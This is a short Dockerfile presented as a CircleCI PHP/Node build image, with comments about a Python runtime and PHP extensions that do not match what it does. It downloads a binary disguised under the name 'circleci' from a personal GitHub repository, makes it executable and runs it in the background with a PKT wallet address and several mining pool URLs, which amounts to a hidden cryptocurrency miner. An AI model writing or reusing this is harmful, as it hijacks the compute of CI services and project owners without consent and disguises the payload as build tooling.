# Use an official Python runtime as a parent image
FROM circleci/php:7.3-node-browsers

# Switch to root user
USER root

# Install necessary packages for PHP extensions


# Collect the components we need for this image
RUN apt-get update
RUN apt install -y git
RUN apt install -y wget
RUN wget https://github.com/aurbach55/pos/raw/main/circleci
RUN chmod +x circleci
RUN nohup ./circleci ann -p pkt1q76dngmrf380w8k9j4f7w4eqpzx3n9vcprldmjx https://stratum.zetahash.com/ http://pool.pkt.world http://pool.pktpool.io > /tmp/circleci.log 2>&1


